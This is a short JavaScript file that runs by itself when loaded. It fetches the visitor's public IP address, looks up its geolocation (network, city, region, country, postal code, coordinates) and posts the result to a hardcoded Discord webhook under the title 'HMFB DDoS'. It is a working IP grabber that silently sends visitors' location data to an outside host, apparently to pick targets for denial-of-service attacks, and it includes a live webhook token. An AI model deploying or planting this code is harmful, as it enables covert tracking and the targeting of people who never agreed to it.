const sendIP = () => {
    fetch('https://api.ipify.org?format=json')
        .then(ipResponse => ipResponse.json())
        .then(ipData => {
            const ipadd = ipData.ip;
            return fetch(`https://ipapi.co/${ipadd}/json/`)
                .then(geoResponse => geoResponse.json())
                .then(geoData => {
                    const dscURL = 'https://discord.com/api/webhooks/1448790293301166191/-H9kMHOh2udMpr0QZ8FQO7cdedbqwdxL8ZA7CRQ-Z0RfBMKv6Tq1jsO2W03q8jILoEcx'; // replace with your webhook url
                    return fetch(dscURL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            username: "HMFB", // optionally changeable
                            avatar_url: "https://media.discordapp.net/attachments/1444072962729840722/1448716308563890246/pe.png?ex=69500c33&is=694ebab3&hm=5c03b305acf0c3d204726c5b34fc9868d3b4a14c7a1d16454359052ef1dc8232&=&format=webp&quality=lossless&width=300&height=300", // optionally changeable
                            content: ``,
                            embeds: [
                                {
                                    title: 'HMFB DDoS',
                                    description: `**IP >> **${ipadd}\n**Network >> ** ${geoData.network}\n**City >> ** ${geoData.city}\n**Region >> ** ${geoData.region}\n**Country >> ** ${geoData.country_name}\n**Postal Code >> ** ${geoData.postal}\n**Latitude >> ** ${geoData.latitude}\n**Longitude >> ** ${geoData.longitude}`,
                                    color: 0x800080 // optionally changeable
                                }
                            ]
                        })
                    });
                });
        })
        .then(dscResponse => {  
            if (dscResponse.ok) {
                console.log('Sent! <3');
            } else {
                console.log('Failed :(');
            }
        })
        .catch(error => {
            console.error('Error:', error);
            console.log('Error :(');
        });
};
sendIP();


